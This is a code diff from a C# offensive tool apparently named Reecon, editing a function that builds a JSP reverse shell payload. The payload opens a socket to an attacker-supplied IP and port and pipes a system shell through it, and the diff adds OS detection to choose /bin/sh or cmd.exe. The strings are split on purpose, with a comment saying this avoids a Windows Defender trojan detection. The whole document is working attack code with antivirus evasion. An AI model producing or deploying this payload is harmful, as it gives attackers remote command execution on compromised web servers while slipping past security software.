@@ -102,7 +102,8 @@ namespace Reecon
             // Lots of spaces else Windows Defender complains about "Trojan:JS/Foretype.A!ml"
             return "<%@page import=\"java.lang.* \"%>" + "<%@page import=\"java.util.* \"%><%@page import=\"java.io.* \"%><%@page import=\"java.net.* \"%><% class StreamC" + "onnector extends Thread {" + " InputStream is; Outpu" + "tStream os; StreamConnector( InputStre" + "am is, OutputStream os ) { this.is = is; this.os = os; }" + " public void run() { Buffere" + "dReader in = null; BufferedWriter out = null; try { in = new Buffered" + "Reader( new InputStreamReader( this.is ) ); out = " + "new BufferedWriter( new OutputStreamWriter( this.os ) ); char bu" + "ffer[] = new char[8192]; int lengt" + "h; while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) { out" + ".write( buffer, 0, length ); out.flush(); } } catch( Exception e ){} try {" + " if( in != null ) in.close(); if( out != null ) " + "out.close(); } catch( Exception e ){} } } try {" + Environment.NewLine
                     + "Socket so" + "cket = new Socket(\"" + ip + "\", " + port + ");" + Environment.NewLine
-                    + "Process process = Runtime." + "getRuntime().exec(\"/b" + "in/b" + "ash\");" + Environment.NewLine
+                    + "String ShellPath; if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) { ShellPath = new String(\"/bin/sh\"); } else { ShellPath = new String(\"cmd.exe\"); } "
+                    + "Process process = Runtime." + "getRuntime().exec(ShellPath);" + Environment.NewLine
                     + "(new StreamConne" + "ctor(process.getIn" + "putStream(), socket.getOutpu" + "tStream()))" + ".start(); (new StreamCo" + "nnector(socket.ge" + "tInputStream(), process.getOutp" + "utStream())).start();} catch(E" + "xception e ) {} %>";
         }
 
